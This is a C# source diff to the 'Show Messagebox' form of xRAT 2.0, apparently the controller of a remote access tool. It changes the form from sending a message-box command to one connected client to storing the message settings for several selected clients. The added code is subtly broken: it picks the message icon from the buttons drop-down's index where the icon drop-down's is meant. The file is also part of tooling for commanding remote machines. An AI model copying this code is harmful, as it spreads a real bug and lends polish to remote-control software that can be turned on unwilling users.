@@ -1,26 +1,22 @@
 ﻿using System;
 using System.Windows.Forms;
-using xServer.Core;
 
 namespace xServer.Forms
 {
     public partial class FrmShowMessagebox : Form
     {
-        private readonly Client _connectClient;
+        private readonly int _selectedClients;
 
-        public FrmShowMessagebox(Client c)
+        public FrmShowMessagebox(int selected)
         {
-            _connectClient = c;
-            _connectClient.Value.FrmSm = this;
+            _selectedClients = selected;
 
             InitializeComponent();
         }
 
         private void FrmShowMessagebox_Load(object sender, EventArgs e)
         {
-            if (_connectClient != null)
-                this.Text = string.Format("xRAT 2.0 - Show Messagebox [{0}:{1}]",
-                    _connectClient.EndPoint.Address.ToString(), _connectClient.EndPoint.Port.ToString());
+            this.Text = string.Format("xRAT 2.0 - Show Messagebox [Selected: {0}]", _selectedClients);
 
             cmbMsgButtons.Items.AddRange(new string[]
             {"AbortRetryIgnore", "OK", "OKCancel", "RetryCancel", "YesNo", "YesNoCancel"});
@@ -28,12 +24,6 @@ namespace xServer.Forms
             cmbMsgIcon.Items.AddRange(new string[]
             {"None", "Error", "Hand", "Question", "Exclamation", "Warning", "Information", "Asterisk"});
             cmbMsgIcon.SelectedIndex = 0;
-        }
-
-        private void FrmShowMessagebox_FormClosing(object sender, FormClosingEventArgs e)
-        {
-            if (_connectClient.Value != null)
-                _connectClient.Value.FrmSm = null;
         }
 
         private void btnTest_Click(object sender, EventArgs e)
@@ -46,9 +36,12 @@ namespace xServer.Forms
 
         private void btnSend_Click(object sender, EventArgs e)
         {
-            new Core.Packets.ServerPackets.ShowMessageBox(txtCaption.Text, txtText.Text,
-                GetMessageBoxButton(cmbMsgButtons.SelectedIndex), GetMessageBoxIcon(cmbMsgIcon.SelectedIndex)).Execute(
-                    _connectClient);
+            Core.Misc.MessageBoxData.Caption = txtCaption.Text;
+            Core.Misc.MessageBoxData.Text = txtText.Text;
+            Core.Misc.MessageBoxData.Button = GetMessageBoxButton(cmbMsgButtons.SelectedIndex);
+            Core.Misc.MessageBoxData.Icon = GetMessageBoxIcon(cmbMsgButtons.SelectedIndex);
+
+            this.DialogResult = DialogResult.OK;
             this.Close();
         }
 
